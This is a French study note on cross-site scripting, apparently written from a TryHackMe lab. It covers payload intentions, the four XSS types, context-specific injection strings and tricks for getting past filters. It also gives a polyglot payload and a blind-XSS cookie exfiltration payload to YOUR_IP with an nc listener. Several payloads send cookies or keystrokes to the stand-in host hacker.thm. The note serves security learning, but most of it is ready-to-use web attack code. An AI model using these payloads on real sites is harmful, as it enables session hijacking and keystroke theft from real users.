## 🧠 Qu’est-ce qu’un **payload** ?

Un **payload** est le **code JavaScript malveillant** que l’on injecte dans un site vulnérable pour qu’il s’exécute dans le navigateur de la victime.  
Il est composé de deux éléments :

1. **L’intention** → ce que le code doit faire (afficher une alerte, voler des cookies, rediriger, etc.).
2. **La modification** → les ajustements nécessaires pour qu’il fonctionne selon l’endroit où il est injecté (dans un tag HTML, une valeur, du JS, etc.).
---
## 🎯 Exemples d’intentions de payloads

|Type d’intention|Objectif|Exemple|
|---|---|---|
|**Proof of Concept**|Montrer qu’une faille existe|`<script>alert('XSS');</script>`|
|**Vol de session**|Envoyer les cookies à un serveur externe|`<script>fetch('https://hacker.thm/steal?cookie='+btoa(document.cookie));</script>`|
|**Keylogger**|Enregistrer les touches tapées|`<script>document.onkeypress=e=>fetch('https://hacker.thm/log?key='+btoa(e.key))</script>`|
|**Business Logic**|Abuser d’une fonction interne|`<script>user.changeEmail('attacker@hacker.thm');</script>`|
## ⚙️ Les 4 types de XSS

| Type              | Description                                                                                        | Exemple de scénario                             | Persistance            |
| ----------------- | -------------------------------------------------------------------------------------------------- | ----------------------------------------------- | ---------------------- |
| **Reflected XSS** | Le code est renvoyé immédiatement dans la réponse HTTP.                                            | Un paramètre d’URL affiché sans filtrage.       | Non persistante        |
| **Stored XSS**    | Le code est stocké dans la base de données et exécuté quand un autre utilisateur consulte la page. | Commentaire de blog malveillant.                | Persistante            |
| **DOM-Based XSS** | Le code s’exécute côté client à cause du JavaScript du site.                                       | Utilisation de `window.location.hash`.          | Côté client            |
| **Blind XSS**     | Similaire à Stored XSS, mais on ne voit pas le résultat soi-même.                                  | Formulaire de contact lu par un administrateur. | Persistante, invisible |

## 🔍 Comment tester une faille XSS
1. Trouver où l’entrée utilisateur est **affichée dans la page** (URL, formulaire, en-têtes…).
2. Essayer de **faire exécuter du JS simple** (`<script>alert(1)</script>`).
3. Si ça ne marche pas, **adapter la payload** selon le contexte :
    - Dans du **HTML** → `<script>...</script>`
    - Dans un **attribut** → `"><script>...</script>`
    - Dans un **textarea** → `</textarea><script>...</script>`
    - Dans du **JavaScript** → `';alert(1);//`

---

## 💡 Exemples de contournement 

|Contexte|Payload efficace|Explication|
|---|---|---|
|HTML simple|`<script>alert('THM');</script>`|Injection directe|
|Dans un attribut|`"><script>alert('THM');</script>`|Ferme la valeur avant le script|
|Dans un textarea|`</textarea><script>alert('THM');</script>`|Ferme le tag avant le script|
|Dans du JS|`';alert('THM');//`|Termine la commande actuelle|
|Filtrage du mot "script"|`<sscriptcript>alert('THM');</sscriptcript>`|Détourne le filtre|
|Filtrage de `<` et `>`|`/images/cat.jpg" onload="alert('THM');`|Exploite un attribut d’événement|
## 🧩 Payload universelle (Polyglot)

Une **payload polyglot** fonctionne dans presque tous les contextes et contourne la plupart des filtres :
```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
## 🕵️‍♂️ Blind XSS et exfiltration

Quand on ne voit pas le résultat soi-même (par ex. un admin ouvre la page plus tard), il faut que la payload **appelle un serveur externe** pour signaler son exécution :

**Payload :**
```html
</textarea><script>
fetch('http://YOUR_IP:9001?cookie=' + btoa(document.cookie));
</script>
```
**Serveur d’écoute :**
```
nc -nlvp 9001
```
